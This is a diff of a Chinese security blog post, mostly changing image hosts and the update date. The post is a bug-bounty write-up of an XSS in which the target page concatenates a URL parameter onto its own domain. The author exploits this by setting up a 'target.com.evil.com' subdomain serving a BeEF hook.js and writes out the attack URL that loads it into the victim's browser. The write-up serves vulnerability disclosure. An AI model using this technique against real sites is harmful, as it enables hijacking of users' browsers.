@@ -271,7 +271,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-9.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/diffxss-9.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -432,7 +432,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-04
+                    2021-11-22
                 </div>
                 
 
@@ -475,11 +475,11 @@
 <h1 id="0x01-发现"><a href="#0x01-发现" class="headerlink" title="0x01 发现"></a>0x01 发现</h1><p>在测试过程中，发现目标存在这样的一个 URL</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;target.com&#x2F;index.html?&#x2F;test.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/diffxss-1.png"></p>
 <p>在当前页面中包含了URL参数里的页面，如果将<code>/test.html</code>改为不存在的页面就会提示404</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/diffxss-2.png"></p>
 <p>查看一下源码，可以发现页面将传参的内容与站点域名进行了拼接，随后对该页面进行访问</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/diffxss-3.png"></p>
 <h1 id="0x02-思考利用"><a href="#0x02-思考利用" class="headerlink" title="0x02 思考利用"></a>0x02 思考利用</h1><p>目标看到这里，刚开始只是尝试的一些常规的 XSS Payload，发现目标都进行了很好的过滤，于是陷入了短暂的思考中。</p>
 <p>之后再看看源码，想着既然它是把参数后的值拼接到站点域名后面，那如果我有个<code>target.com.evil.com</code>的域名，我在URL中传参<code>.evil.com</code>，页面拼接后所访问的地址不就是这样：</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;target.com.evil.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -487,9 +487,9 @@
 <p>这样一来，我在<code>target.com.evil.com</code>站点下，开个beef，在我访问<code>http://target.com/index.html?.evil.com</code>的时候，目标页面就会访问到我自己的域名，如果访问的域名页面中包含了 beef 的 hook.js，那目标不就上线了嘛，nice</p>
 <p><strong>开整！</strong></p>
 <p>首先要有个域名和 vps ，有了域名后再设置一个 <code>target.com</code> 的子域名，设置子域名也很简单，直接在域名的DNS记录中添加一条A记录即可，名称就是<code>target.com</code>，内容就是要解析的 vps IP 地址。</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/diffxss-4.png"></p>
 <p>测试一下，beef 的 hook.js 能不能访问</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/diffxss-5.png"></p>
 <blockquote>
 <p>这里有个坑，如果域名没有备案并且 vps 是国内的，如果同时 beef 开在 80 端口，就会导致页面一打开就会提示域名未备案，这时只要把 beef 放在其他不常用的端口上就不会提示域名未备案了。</p>
 </blockquote>
@@ -498,15 +498,15 @@
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;target.com&#x2F;index.html?.evil.com:3000&#x2F;demos&#x2F;basic.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>浏览器打开该页面</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/diffxss-6.png"></p>
 <p>可以看到当前页面成功访问到了<code>target.com.evil.com:3000/demos/basic.html</code>，此时看看 beef 里有没有上线</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/diffxss-7.png"></p>
 <p>beef 成功上线，最后再来弹个窗，嘿嘿</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/diffxss-8.png"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/diffxss-9.png"></p>
 <h1 id="0x03-最后"><a href="#0x03-最后" class="headerlink" title="0x03 最后"></a>0x03 最后</h1><p>这个漏洞提交上去之后，相较于之前提交的较为常规的XSS，厂商给这个XSS 是其双倍的积分。</p>
 <p>平时自己还是要多多理解漏洞产生的原因才是，要是直接用工具扫、Fuzz字典跑估计就发现利用不了这个洞了。</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/TeamsSix_Subscription_Logo2.png"></p>
 
                 
             </div>
@@ -658,7 +658,7 @@
                 <a href="/210129-191714.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_19-11-30.png" class="responsive-img" alt="【经验总结】CS与MSF之间的会话传递">
+                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2020-07-26_19-11-30.png" class="responsive-img" alt="【经验总结】CS与MSF之间的会话传递">
                         
                         <span class="card-title">【经验总结】CS与MSF之间的会话传递</span>
                     </div>
@@ -714,7 +714,7 @@
                 <a href="/202025-235012.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/url_batch_discovery_1.png" class="responsive-img" alt="【工具分享】一款自己经常使用的URL批量识别小工具">
+                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/url_batch_discovery_1.png" class="responsive-img" alt="【工具分享】一款自己经常使用的URL批量识别小工具">
                         
                         <span class="card-title">【工具分享】一款自己经常使用的URL批量识别小工具</span>
                     </div>
